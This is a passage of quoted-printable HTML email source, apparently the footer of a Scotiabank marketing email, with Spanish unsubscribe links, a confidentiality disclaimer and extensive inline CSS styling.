+goe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont,=
+ Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: b=
+aseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: black; PADDING-BOTTOM: 0px; FONT-S=
+TYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHAN=
+S: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px' hr=
+ef=3D"https://cancelarsuscripcion.scotiabank.com/?entid=3DBNS&amp;buid=3DSB=
+NK" rel=3D"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Li=
+ght", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -=
+webkit-font-smoothing: antialiased'>https://cancelarsuscripcion.scotiabank.=
+com?entid=3DBNS&amp;buid=3DSBNK</SPAN><WBR style=3D"-webkit-font-smoothing:=
+ antialiased">
+ <WBR style=3D"-webkit-font-smoothing: antialiased"><WBR style=3D"-webkit-f=
+ont-smoothing: antialiased"></A>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>Para dejar de r=
+ecibir mensajes electr?nicos comerciales de otras entidades incluidas en la=
+ lista adjunta, haga clic aqu?:&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "Se=
+goe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont,=
+ Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: b=
+aseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: black; PADDING-BOTTOM: 0px; FONT-S=
+TYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHAN=
+S: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px' hr=
+ef=3D"https://www.unsubscribe.gwm.scotiabank.com/?page=3Dgwm&amp;lang=3Des"=
+ rel=3D"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Li=
+ght", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -=
+webkit-font-smoothing: antialiased'>https://www.unsubscribe.gwm.scotiabank.=
+com?page=3Dgwm&amp;lang=3Des</SPAN><WBR style=3D"-webkit-font-smoothing: an=
+tialiased">
+ <WBR style=3D"-webkit-font-smoothing: antialiased"></A>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>
+Este correo electr?nico puede contener informaci?n confidencial cuyo uso po=
+r parte de personas distintas de los destinatarios del mismo est? prohibido=
+. El mensaje puede tener tambi?n datos importantes para los archivos del(de=
+ los) destinatario(s) a quien(es) est? dirigido. Para m?s detalles, por fav=
+or dirigirse a:&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "Se=
+goe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont,=
+ Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: b=
+aseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: black; PADDING-BOTTOM: 0px; FONT-S=
+TYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHAN=
+S: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px' hr=
+ef=3D"http://www.scotiabank.com/email_disclaimer/email_espanol.html" rel=3D=
+"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Li=
+ght", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -=
+webkit-font-smoothing: antialiased'>http://www.scotiabank.com/email_disclai=
+mer/email_espanol.html</SPAN><WBR style=3D"-webkit-font-smoothing: antialia=
+sed"><WBR style=3D"-webkit-font-smoothing: antialiased">
+ </A>
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
+t European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helve=
+tica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
+ORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE:=
+ normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING:=
+ normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant=
+-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; FO=
+NT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; OR=
+PHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0p=
+x; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>&nbsp;&nbsp;</S=
+PAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>&nbsp;&nbsp;</SPAN></BODY></HTML>
+
